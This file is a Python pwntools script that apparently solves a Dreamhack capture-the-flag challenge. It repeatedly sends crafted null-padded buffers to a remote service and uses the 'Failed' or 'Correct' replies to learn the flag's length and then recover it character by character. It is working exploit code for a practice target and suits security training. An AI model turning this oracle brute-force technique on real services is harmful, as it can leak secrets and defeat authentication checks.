from pwn import *

length = 0
port = 21841
# get length
for i in range(63,-1,-1):
  rem = remote("host1.dreamhack.games", port)
  payload = b"A" * i + b"\x00" * (64 - i) + b"A" * i
  rem.sendafter(b"? ", payload)
  if b'Failed' in rem.recvline():
    length = i + 1
    break
  pause(1)

# get flag
alpahbet = [chr(i) for i in range(0x20, 0x7f)]
flag = "}"
for i in range(length - len(flag) - 1, 2, -1):
  for letter in alpahbet:
    rem = remote("host1.dreamhack.games", port)
    payload = b"A" * i + letter.encode() + flag.encode()
    payload += b"\x00" * (64 - len(payload))
    payload += b"A" * i
    rem.sendafter(b"? ", payload)
    if b'Correct' in rem.recvline():
      flag = letter + flag
      break
    pause(1)

print("DH{" + flag)